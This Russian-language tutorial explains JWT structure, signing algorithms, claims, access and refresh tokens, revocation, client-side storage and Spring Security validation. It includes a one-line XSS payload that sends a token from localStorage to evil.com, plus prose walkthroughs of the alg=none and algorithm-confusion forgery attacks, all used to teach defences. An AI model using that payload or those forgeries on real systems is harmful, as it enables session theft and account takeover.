# 118. JWT токены: структура, подпись, access vs refresh, security

## Зачем это знать

JWT — фундамент современной аутентификации. Каждый OAuth/OIDC provider (Keycloak, Auth0, Okta, Google) выдаёт JWT-токены. Каждый микросервис проверяет JWT для авторизации. Каждый API получает `Authorization: Bearer eyJ...` — это JWT. Если приложение работает с identity — работает с JWT.

Но JWT часто используют как «черный ящик» — Spring Security проверил, значит правильный, декодировали payload — вот email пользователя. Пока не сталкиваются с проблемами: почему подпись не проверяется когда алгоритм `none` (реальная CVE!). Как работает key rotation и что делать когда пришёл JWT с неизвестным `kid`. Почему revoke JWT практически невозможно (нельзя «отозвать» подписанный документ). Что делать когда пользователя нужно принудительно разлогинить. Разница между access и refresh token'ами не только по назначению, но и по формату (refresh часто **не JWT**). Как правильно хранить JWT на клиенте (localStorage — плохо, httpOnly cookie — почему лучше).

Разница между «использую JWT» и «понимаю JWT» — способность объяснить: что именно подписывается, почему после декодирования header'а нельзя доверять его содержимому до проверки подписи, как атака `alg=none` работала (и почему её больше нет в правильных библиотеках), как правильно выбрать алгоритм подписи (HS256 vs RS256), почему access_token короткоживущий а refresh — долгоживущий, что такое sliding sessions и как реализовать logout когда JWT stateless.

Разберём: что такое JWT фундаментально (self-contained + signed), три части (header.payload.signature) в деталях с реальным декодированием. Алгоритмы подписи (HMAC HS256 vs RSA RS256 vs ECDSA ES256) — когда какой. Standard claims (iss, sub, aud, exp, iat, nbf, jti). Custom claims в enterprise. JWKS и key rotation. Access token vs Refresh token — по назначению, формату, хранению, security. Refresh token rotation. **Revocation problem** — почему JWT нельзя отозвать и что делают на практике (blacklist, короткие TTL, sliding sessions). Session management при stateless JWT. Хранение на клиенте (SPA — httpOnly cookies vs localStorage, mobile — secure storage). Security pitfalls: alg=none, weak secrets, algorithm confusion, missing exp/aud check, XSS кража, CSRF при cookies. Правильная валидация JWT в приложении. Spring Security JWT support.

OAuth/OIDC протокол — файл 117. Keycloak реализация — 119. Spring Security integration — 120. Здесь фокус на самом JWT.

## Что такое JWT

**JWT** (JSON Web Token, произносится «джот») — стандарт компактного самодостаточного токена (RFC 7519). Ключевые свойства:

**Self-contained** — токен содержит всю необходимую информацию о пользователе (id, email, roles, expiration). Не нужно ходить в БД проверять «что за пользователь» — всё в токене.

**Signed** — токен подписан приватным ключом. Любое изменение содержимого = подпись невалидна. Не защищает от чтения (payload виден), но защищает от подделки.

**Stateless** — сервер не хранит session state. Пришёл токен, проверил подпись, доверяй содержимому. Идеально для микросервисов (не нужен shared session store).

**Компактный** — base64-URL encoded строка. Может передаваться через URL, headers, cookies.

Пример JWT:

```
eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6ImFiYzEyMyJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IklJb2FuIElpb2FuIiwiaWF0IjoxNTE2MjM5MDIyLCJleHAiOjE1MTYyNDI2MjJ9.dBjftJeZ4CVP-mB92K27uhbUJU1p1r_wW1gFWFOEjXk-9-9zRZoLo0J...
```

Три части разделённые точками:
1. **Header** — метаданные (алгоритм, тип).
2. **Payload** — данные (claims — утверждения о пользователе).
3. **Signature** — подпись header'а + payload'а.

## Структура: три части подробно

### Header

Первая часть до первой точки — Base64URL encoded JSON:

```
eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6ImFiYzEyMyJ9
```

Декодируем (Base64):

```json
{
  "alg": "RS256",
  "typ": "JWT",
  "kid": "abc123"
}
```

Поля:
- **`alg`** — algorithm подписи. `HS256` (HMAC-SHA256, симметричный), `RS256` (RSA-SHA256, асимметричный), `ES256` (ECDSA-SHA256). Обязательное.
- **`typ`** — тип токена. Обычно `JWT`. Опциональное но рекомендуется.
- **`kid`** — key ID. Идентифицирует какой ключ использовать для проверки (когда AS имеет несколько ключей — key rotation). Опционально но необходимо в проде с ротацией.

**Header НЕ секретен**. Любой может декодировать base64 и посмотреть alg/kid. Это нормально — секрет в подписи, не в header'е.

### Payload (Claims)

Вторая часть — тоже Base64URL encoded JSON:

```
eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IklJb2FuIElpb2FuIiwiaWF0IjoxNTE2MjM5MDIyLCJleHAiOjE1MTYyNDI2MjJ9
```

Декодируем:

```json
{
  "sub": "1234567890",
  "name": "Иван Иванов",
  "iat": 1516239022,
  "exp": 1516242622
}
```

Payload содержит **claims** — утверждения о пользователе. Три категории claims:

**Registered claims** — стандартные, определённые в RFC 7519:
- **`iss`** (issuer) — кто выдал токен. `https://accounts.google.com`, `https://keycloak.example.com/realms/myrealm`.
- **`sub`** (subject) — кому принадлежит. Обычно user ID.
- **`aud`** (audience) — для кого предназначен. Client ID или array клиентов.
- **`exp`** (expiration) — когда истекает (Unix timestamp).
- **`nbf`** (not before) — до этого момента токен невалиден.
- **`iat`** (issued at) — когда выдан.
- **`jti`** (JWT ID) — уникальный идентификатор токена (для revocation blacklist).

**Public claims** — стандартизированные IANA (для интероперабельности):
- **`name`**, **`email`**, **`email_verified`**, **`preferred_username`**, **`given_name`**, **`family_name`**, **`picture`**, **`locale`**, **`updated_at`** — OIDC standard claims.

**Private claims** — custom, специфичные для приложения:
- **`roles`** — список ролей.
- **`tenant_id`** — для multi-tenant SaaS.
- **`permissions`** — детальные permissions.
- Всё что угодно нужное приложению.

**Пример полного payload из Keycloak**:

```json
{
  "exp": 1712345678,
  "iat": 1712342078,
  "jti": "abc-123-def-456",
  "iss": "https://keycloak.example.com/realms/myapp",
  "aud": "account",
  "sub": "user_uuid_12345",
  "typ": "Bearer",
  "azp": "my-web-app",
  "session_state": "session-uuid",
  "acr": "1",
  "realm_access": {
    "roles": ["ADMIN", "USER"]
  },
  "resource_access": {
    "my-api": {
      "roles": ["api:read", "api:write"]
    }
  },
  "scope": "openid email profile",
  "email_verified": true,
  "preferred_username": "ivan.ivanov",
  "email": "ivan@example.com",
  "name": "Иван Иванов",
  "given_name": "Иван",
  "family_name": "Иванов"
}
```

Много информации в одном токене — no need к БД для базовых проверок.

**КРИТИЧЕСКИ ВАЖНО**: **Payload НЕ секретен**. Любой может декодировать base64 и прочитать. Не класть в JWT пароли, банковские карты, приватные данные! JWT защищает от **подделки**, не от **чтения**.

### Signature

Третья часть — подпись:

```
dBjftJeZ4CVP-mB92K27uhbUJU1p1r_wW1gFWFOEjXk-9-9zRZoLo0J...
```

Вычисляется:
```
signature = SIGN(
    algorithm_from_header,
    key,
    BASE64URL(header) + "." + BASE64URL(payload)
)
```

Подписывается **строка** «header.payload». Не JSON, а конкретная base64 строка. Это важно потому что base64 encoding может отличаться (whitespace, padding) — подписываем именно то что передаётся.

**Проверка**:

1. Разбить JWT по точкам на 3 части.
2. Взять header, payload — конкатенировать с точкой.
3. Вычислить signature с известным ключом.
4. Сравнить с signature из JWT.
5. Если совпадают → JWT не подделан.

Плюс проверка claims:
- `exp` не в прошлом.
- `iat` не в будущем.
- `nbf` (если есть) уже наступил.
- `iss` — от ожидаемого AS.
- `aud` — для нашего приложения.

## Алгоритмы подписи: HS256 vs RS256 vs ES256

### HS256 (HMAC-SHA256): симметричный

Один **секретный ключ** используется и для подписи, и для проверки. Как классический password.

```
signature = HMAC-SHA256(secret, header + "." + payload)
```

**Плюсы**: быстрый, простой. Один ключ — просто конфигурировать.

**Минусы**: **один ключ** — все стороны должны его знать. AS подписывает, RS проверяет → RS знает секрет. Если много микросервисов — секрет должен быть везде. Компрометация одного микросервиса = компрометация всех. Также RS **может подписывать** токены (имеет секрет), что нарушает принцип разделения ответственности.

**Когда использовать**: небольшое приложение, один issuer + один resource server, secret безопасно распространён.

**Length ключа**: минимум 256 бит (32 байта случайных). Меньше — уязвимо к brute-force. Многие библиотеки требуют минимум.

### RS256 (RSA-SHA256): асимметричный

**Пара ключей**: приватный (AS подписывает) и публичный (RS проверяет). Обычно 2048 или 4096 бит.

```
signature = RSA-SIGN(private_key, SHA256(header + "." + payload))
verify: RSA-VERIFY(public_key, signature, SHA256(header + "." + payload))
```

**Плюсы**: **RS не может подписывать** (не имеет приватного ключа) → чётко: только AS создаёт токены. Публичный ключ можно раздать всем безопасно (JWKS endpoint). Компрометация RS не позволяет создавать токены.

**Минусы**: медленнее HS256 (в разы). Больше ключи. Более сложный setup.

**Когда использовать**: enterprise, много RS/микросервисов, публичный API. **Стандарт для OAuth/OIDC**.

### ES256 (ECDSA-SHA256): асимметричный на эллиптических кривых

Как RS256 но на elliptic curve вместо RSA. Ключи короче (256 бит) при том же уровне безопасности. Быстрее чем RS256.

**Когда использовать**: performance-critical, много токенов в секунду. Современные системы часто выбирают ES256 вместо RS256.

### Практические рекомендации

- **Микросервисы + OAuth**: **RS256** (стандарт).
- **Мелкое app с одним server**: HS256 приемлем.
- **Legacy или простой use case**: HS256 проще.
- **Performance critical**: ES256.
- **Никогда**: `alg: none` (см. security ниже).

## Standard claims: детально

### iss (issuer) — кто выдал

`"iss": "https://keycloak.example.com/realms/myapp"` — URL identity provider'а. Клиент проверяет: соответствует ожидаемому AS.

Защита от: подмены. Даже если атакующий получил приватный ключ **другого** AS и подписал токен — `iss` не совпадёт с ожидаемым, будет отвергнут.

### sub (subject) — кому принадлежит

`"sub": "user_uuid_12345"` — ID пользователя (или client_id для Client Credentials flow).

**Важно**: `sub` **уникален внутри одного `iss`**. Пользователь `123` в Google — не тот же что `123` в Facebook. Уникальный идентификатор пользователя глобально: `iss + sub`.

### aud (audience) — для кого

`"aud": "my-app-client-id"` — client_id для кого выдан. RS проверяет: aud содержит мой client_id.

Защита от: подмены audience. Пользователь получил токен для app A. Атакующий подсовывает этот токен в app B. App B проверяет aud — не мой → отвергнуть.

Может быть массивом: `"aud": ["my-app", "my-api"]`. Тогда RS проверяет что его id в массиве.

### exp (expiration) — когда истекает

`"exp": 1712345678` — Unix timestamp когда токен станет невалиден. Проверять **обязательно**.

Типичные значения:
- Access token: 5-60 минут.
- Refresh token: часы-месяцы.
- ID token: сравним с access token или короче.

Короткие access token = меньше impact компрометации. Даже если украли — часовое окно. Дальше нужен refresh_token, который защищён отдельно.

### iat (issued at) — когда выдан

`"iat": 1712342078` — когда выдан. Полезно для:
- Аудит («когда пользователь получил этот токен»).
- Rate limiting («не более 1 токен в минуту»).
- Определение «свежести» аутентификации (`auth_time` в OIDC).

### nbf (not before) — активация в будущем

`"nbf": 1712349000` — до этого момента токен невалиден. Позволяет выдать токен «который станет активен через 5 минут». Редко используется.

### jti (JWT ID) — уникальный ID токена

`"jti": "abc-123-def-456"` — уникальный идентификатор конкретного токена (UUID).

Использование:
- **Blacklist для revocation** — храним jti отозванных токенов, при проверке JWT проверяем не в blacklist ли.
- **Deduplication** — сервер не обрабатывает один и тот же токен дважды (защита от replay в некоторых сценариях).

## Access Token vs Refresh Token: не только назначение

Разбор в 117 был про назначение. Теперь про **формат и жизненный цикл**.

**Access Token**:
- Обычно **JWT** (для stateless проверки на RS).
- **Короткоживущий** (5-60 минут).
- Содержит full payload с claims пользователя.
- **Отправляется в каждом API запросе** (`Authorization: Bearer`).
- Проверяется **локально** RS через подпись + JWKS.

**Refresh Token**:
- **Часто НЕ JWT** — обычно opaque (случайная строка). Почему?
  - Refresh_token используется только с AS, не с RS → не нужна self-containedness.
  - Opaque позволяет AS хранить состояние (rotation, revocation) без сложности с JWT.
- **Долгоживущий** (часы-недели-месяцы).
- **Отправляется только к AS** (token endpoint).
- Проверяется AS через **lookup в БД** (существует? не отозван? принадлежит client'у?).

**Разный жизненный цикл**:

```
Access Token:
Login → выдан → используется 1 час → истёк → нужен новый.

Refresh Token:
Login → выдан → используется много раз при истечении access → 
    → пользователь logout → отозван
    → долгое отсутствие → истёк (месяцы)
```

## Refresh Token Rotation

Best practice — **rotation**. При каждом использовании refresh_token AS:
1. Инвалидирует старый.
2. Выдаёт новый refresh_token.
3. Отдаёт новый access_token + новый refresh_token клиенту.

Клиент **всегда** использует последний refresh_token.

**Защита от кражи**:

Сценарий без rotation: refresh_token украден → атакующий использует его → получает access_token → ходит в API. Пользователь logout не помогает если атакующий уже имеет refresh_token.

Сценарий с rotation: refresh_token украден → **атакующий использует первый** → получает новый access + refresh → **legit клиент попытается использовать старый** (он у него сохранён) → AS видит «уже использован» → **терминирует сессию всего пользователя**. Пользователь замечает — заходит снова.

AS может даже отправить alert («подозрительная активность») при повторном использовании старого refresh_token.

Реализовано в Keycloak, Auth0, Okta. Включается опцией `Revoke Refresh Token` в client settings.

## Revocation problem: почему JWT нельзя отозвать

**Фундаментальная проблема JWT** — stateless по дизайну. Токен валиден пока `exp` не прошёл. Сервер не может «отозвать» уже выданный подписанный документ.

Сценарии где нужен revoke:
- Пользователь logout — токены должны перестать работать.
- Пользователь сменил пароль — все старые токены должны инвалидироваться.
- Обнаружена компрометация — срочный logout.
- Пользователь удалён / забанен.

**Проблема**: JWT self-contained. RS проверяет подпись + exp. Подпись валидна, exp в будущем → токен принимается. Никакой сервер не знает что пользователь logged out.

**Решения**:

### 1. Короткие access_token TTL

Access_token на 5-15 минут. Через 15 минут максимум украденный токен станет невалидным. Revocation actually не нужен — просто ждать expiration.

Компромисс: пользовательский опыт (нужны refresh чаще), нагрузка на AS. Но безопасность выше.

### 2. Blacklist (Deny list)

Хранить JTI отозванных токенов в Redis / БД. RS при проверке смотрит blacklist. Если jti в blacklist → отвергнуть даже с валидной подписью.

Плюсы: работает. Минусы: **stateful** (нужен shared store), extra check на каждый запрос, blacklist растёт (нужен cleanup — можно чистить после exp).

### 3. Whitelist (allowlist)

Хранить JTI **валидных** токенов. Toggle бита при выдаче / отзыве. RS проверяет: jti в whitelist?

Ещё более stateful — фактически возврат к session-based. Теряется смысл JWT.

### 4. User-level revocation через версию

В БД хранить `token_version` для каждого пользователя. Внутри JWT — `token_version` claim.

При logout / password change — увеличиваем `token_version` у пользователя.

RS при проверке смотрит: user's current version в БД == version в JWT? Если нет → отвергнуть.

Плюсы: не нужно хранить каждый jti. Минусы: extra DB call на каждый запрос (можно кэшировать).

### 5. Комбинация

Реальный prod-подход: **короткие access_token (5-15 мин) + blacklist для срочных ситуаций + user-version для logout**.

Обычные случаи — просто ждём expiration. Компрометация — срочно blacklist на 15 минут (пока не истечёт). Logout — увеличиваем user-version.

## Session management при stateless JWT

Классические web-сессии — session_id в cookie, session state на сервере. Logout = удалить session на сервере.

С JWT — по-другому:

**Sliding sessions**. Access_token живёт 15 минут. Refresh_token живёт 30 дней от последнего использования (не от выдачи!). При каждом refresh — refresh_token rotation + reset expiration. Если пользователь активен — токены обновляются, session жива. Не активен 30 дней — refresh_token истёк, надо relogin.

**Absolute session timeout**. Refresh_token живёт **максимум** N дней от **выдачи** (независимо от активности). Через N дней — принудительный relogin. Стандарт для safety-critical (banking — 30 дней абсолют).

**Logout**:
- **User logs out на клиенте** — клиент удаляет токены локально. Пока access_token не истёк — технически всё ещё валиден для API. Обычно приемлемо (короткий TTL).
- **Global logout** — AS вызывает revocation refresh_token. Blacklist access_token (если реализовано). Все sessions пользователя убиты.

**Session state в Keycloak**: даже с JWT Keycloak может хранить session на своей стороне (для управления). Backchannel logout — Keycloak шлёт notification всем клиентам «пользователь logged out», клиенты чистят локальный state.

## Хранение JWT на клиенте

Три варианта, каждый со своими trade-offs.

### 1. localStorage / sessionStorage (SPA)

Просто. `localStorage.setItem('token', accessToken)`. Доступно из JavaScript.

**Проблема — XSS**. Атакующий inject'ит скрипт → читает localStorage → крадёт токен. `<script>fetch('https://evil.com/steal?t=' + localStorage.token)</script>`. Одна XSS уязвимость = все токены пользователей compromised.

**Не рекомендуется** для sensitive приложений (finance, healthcare).

### 2. httpOnly cookie

Cookie с флагом `HttpOnly` — недоступна JavaScript, только автоматически прикрепляется браузером к запросам.

```
Set-Cookie: access_token=eyJ...; HttpOnly; Secure; SameSite=Strict; Path=/
```

**XSS не поможет** — JS не может прочитать. Даже если inject'нут скрипт, токен не украсть.

**CSRF risk** — cookie автоматически прикрепляется, атакующий может отправить запрос с сайта evil.com к yourapp.com, браузер пришлёт cookie. Защита — `SameSite=Strict` (cookie не отправляется в cross-site запросах) или CSRF-tokens.

**Best practice для SPA**: refresh_token в httpOnly cookie, access_token в памяти (variable в JS). Access_token недолго живёт, кража через XSS impact limited. Refresh_token защищён от XSS.

### 3. Memory (SPA state)

Просто переменная в JS. Не сохраняется между page reload — надо refresh при каждом старте.

**Плюсы**: недоступно XSS (в отличие от localStorage). Быстро.

**Минусы**: пропадает при reload. Приемлемо для access_token (короткий), не для refresh (нужно каждый раз relogin).

### 4. Secure storage (mobile)

iOS Keychain, Android Keystore. Encrypted storage, доступ только приложению.

Стандарт для mobile. Токены (access и refresh) — в secure storage.

## Security pitfalls: реальные атаки

### `alg=none` атака (CVE-2015-9235)

Старые библиотеки JWT принимали токен с `alg: none` — «не проверяем подпись». Атакующий:
1. Взял валидный JWT.
2. Декодировал.
3. Изменил `alg: RS256` на `alg: none` в header.
4. Изменил payload как хотел (например `role: admin`).
5. Убрал signature.
6. Отправил на сервер.

Уязвимая библиотека принимала «none» и не проверяла подпись → атакующий получил admin.

**Fix**: правильные библиотеки требуют явно указать разрешённые алгоритмы. `alg: none` больше не принимается по умолчанию. Всегда указывать whitelist алгоритмов явно.

### Algorithm confusion (RS256 ↔ HS256)

Атака: сервер настроен для RS256, публичный ключ известен. Атакующий:
1. Создаёт JWT с `alg: HS256`.
2. Подписывает **публичным ключом** сервера (как секретом для HS256).
3. Отправляет.

Уязвимая библиотека: видит `alg: HS256`, использует «настроенный ключ» (публичный, но она этого не знает) для HMAC проверки. Проверка проходит.

**Fix**: библиотеки должны требовать конкретный алгоритм для конкретного ключа. Не «попробуй проверить любым способом». Явное указание `.setAlgorithm(RS256)` при валидации.

### Weak secrets для HS256

`secret = "password123"` — brute-force за минуты. Атакующий получает секрет → может генерировать любые токены.

**Fix**: минимум 256 бит **случайных** данных. `openssl rand -base64 32`. Хранить в secret manager (Vault, AWS Secrets Manager), не в git.

### Missing exp / aud / iss check

Библиотеки часто проверяют подпись автоматически, но НЕ обязательно `exp`, `aud`, `iss`. Разработчик должен явно проверить.

**Fix**: всегда после проверки подписи проверять:
- `exp` не в прошлом.
- `iat` не в будущем (защита от clock skew в разумных пределах).
- `iss` == expected.
- `aud` содержит my client_id.

Spring Security делает это автоматически если правильно настроен `JwtDecoder`.

### JWT в URL

`GET /api/orders?access_token=eyJ...` — token в URL. Попадает в:
- Browser history.
- Server access logs.
- Referer headers (при переходе на другой сайт).
- Analytics.

**Fix**: только `Authorization: Bearer <token>` header, не query параметр.

### Long-lived access tokens

Access_token на 30 дней — украли, у атакующего месяц доступа. Не помогает logout, не помогает изменение пароля (JWT stateless).

**Fix**: короткие access (5-60 мин) + refresh_token.

### XSS кража

`localStorage.setItem('token', ...)` + XSS уязвимость → всё пропало.

**Fix**: httpOnly cookies для refresh, memory для access, CSP headers для защиты от XSS.

## Правильная валидация JWT: полный чек-лист

При получении JWT сервер должен проверить:

**1. Формат** — 3 части разделённые точками, каждая base64URL-декодируется как валидный JSON.

**2. Header:**
- `alg` — из whitelist разрешённых. **Никогда не `none`**.
- `kid` (если ротация) — известен в JWKS.

**3. Подпись:**
- Использовать правильный ключ (из JWKS по `kid` или configured).
- Использовать правильный алгоритм (соответствует ключу — RSA public key требует RS256/384/512, не HS256).
- Verify подпись header'а + payload'а.

**4. Claims:**
- `exp` — не в прошлом (можно с clock skew 30 сек).
- `iat` — не в будущем (можно с clock skew).
- `nbf` (если есть) — уже прошёл.
- `iss` — соответствует ожидаемому.
- `aud` — содержит my client_id.
- `sub` — есть (не пустой).

**5. Business validation:**
- Пользователь `sub` существует и активен.
- Роли `roles` allow'ены для запрашиваемого действия.
- `jti` не в blacklist (если revocation реализовано).

Спринг Security делает шаги 1-4 автоматически при правильной конфигурации. Шаг 5 — задача приложения.

## Spring Security и JWT

Spring Security 6+ имеет полную поддержку JWT из коробки.

**Настройка Resource Server** для проверки JWT от Keycloak:

```yaml
spring:
  security:
    oauth2:
      resourceserver:
        jwt:
          issuer-uri: https://keycloak.example.com/realms/myapp
          # jwks-uri автоматически из /.well-known/openid-configuration
```

Или явно:

```yaml
spring:
  security:
    oauth2:
      resourceserver:
        jwt:
          jwk-set-uri: https://keycloak.example.com/realms/myapp/protocol/openid-connect/certs
```

**Что делает Spring автоматически**:
1. При старте — читает discovery endpoint, кэширует JWKS.
2. При каждом запросе с `Authorization: Bearer eyJ...` — извлекает JWT, проверяет:
   - Подпись через JWKS.
   - Claims `iss`, `exp`, `iat`, `nbf`.
   - Если `audiences` настроен — проверяет `aud`.
3. Успех → создаёт `JwtAuthenticationToken` в `SecurityContext`.
4. Failure → 401 Unauthorized.

**Использование в контроллере**:

```java
@RestController
public class OrderController {
    
    @GetMapping("/api/orders")
    @PreAuthorize("hasAuthority('SCOPE_orders:read')")
    public List<Order> list(@AuthenticationPrincipal Jwt jwt) {
        String userId = jwt.getSubject();
        List<String> roles = jwt.getClaimAsStringList("realm_access.roles");
        // ...
    }
}
```

**Кастомная конфигурация** для сложных сценариев:

```java
@Configuration
public class SecurityConfig {
    
    @Bean
    SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http
            .authorizeHttpRequests(auth -> auth
                .requestMatchers("/api/public/**").permitAll()
                .anyRequest().authenticated()
            )
            .oauth2ResourceServer(oauth2 -> oauth2
                .jwt(jwt -> jwt.jwtAuthenticationConverter(customConverter()))
            );
        return http.build();
    }
    
    private JwtAuthenticationConverter customConverter() {
        JwtAuthenticationConverter converter = new JwtAuthenticationConverter();
        converter.setJwtGrantedAuthoritiesConverter(jwt -> {
            // Keycloak-специфичное: роли в realm_access.roles
            Map<String, Object> realmAccess = jwt.getClaim("realm_access");
            if (realmAccess == null) return Collections.emptyList();
            List<String> roles = (List<String>) realmAccess.get("roles");
            return roles.stream()
                .map(r -> new SimpleGrantedAuthority("ROLE_" + r))
                .collect(Collectors.toList());
        });
        return converter;
    }
}
```

Детально Spring Security + Keycloak — файл 120.

## Заключение

**JWT** — компактный self-contained подписанный токен. Три части: header (алгоритм, kid) + payload (claims) + signature. Base64URL encoded, разделены точками.

**Header НЕ секретен**, **payload НЕ секретен** — только подпись гарантирует что не подделан. Не класть в JWT приватные данные (пароли, банковские карты).

**Алгоритмы подписи**: HS256 (симметричный, простой но один ключ везде), **RS256 (стандарт для OAuth)** — асимметричный, публичный ключ раздаётся, приватный только у AS. ES256 — быстрее RS256, современная альтернатива.

**Standard claims**: `iss` (issuer), `sub` (subject/user_id), `aud` (audience/client_id), `exp` (expiration), `iat` (issued at), `nbf` (not before), `jti` (unique ID). Обязательно проверять `exp`, `iss`, `aud`.

**Custom claims** — что угодно specific для приложения: roles, permissions, tenant_id.

**Access Token** vs **Refresh Token**:
- **Access**: JWT (обычно), короткоживущий (5-60 мин), отправляется к RS каждый запрос, проверяется локально через JWKS.
- **Refresh**: часто opaque (не JWT), долгоживущий (часы-месяцы), только к AS token endpoint, проверяется через lookup в БД.

**Refresh Token Rotation** — при каждом использовании новый refresh_token, старый инвалидируется. Защита от кражи — атакующий может использовать украденный один раз, следующий legit refresh терминирует всю сессию.

**Revocation problem** — JWT stateless, нельзя «отозвать» подписанный документ. Решения: короткие access TTL (5-15 мин, ждём expiration); blacklist по jti в Redis (RS проверяет); user-level token_version в БД (увеличиваем при logout). Реальный prod = комбинация.

**Session management**: sliding sessions (refresh обновляется при активности), absolute timeout (максимум N дней от выдачи), logout через revocation refresh_token + backchannel notification клиентам.

**Хранение на клиенте**:
- **SPA**: refresh в httpOnly cookie + access в JS memory. Не localStorage (XSS risk).
- **Mobile**: iOS Keychain / Android Keystore.
- **Backend**: session в БД, JWT токены только для API calls.

**Security pitfalls**:
- `alg: none` (историческая CVE) — whitelist алгоритмов явно.
- Algorithm confusion RS256↔HS256 — библиотеки должны требовать конкретный alg.
- Weak HS256 secrets — минимум 256 бит случайных.
- Missing `exp`/`aud`/`iss` check — проверять всегда.
- JWT в URL — только header.
- Long-lived access tokens — короткие + refresh.
- XSS кража из localStorage — httpOnly cookie.

**Правильная валидация**: формат → header (alg whitelist, kid known) → signature (правильный ключ + правильный alg) → claims (exp, iat, nbf, iss, aud) → business (user active, roles allow).

**Spring Security 6+** — полная поддержка JWT из коробки через `spring.security.oauth2.resourceserver.jwt.issuer-uri`. Автоматически discovery + JWKS + validation. Custom `JwtAuthenticationConverter` для extraction ролей из специфичных claims (например Keycloak `realm_access.roles`).

OAuth/OIDC протокол детально — файл 117. Keycloak как реализация IDP — 119. Spring Security integration полностью — 120. Здесь была глубина по самому JWT.
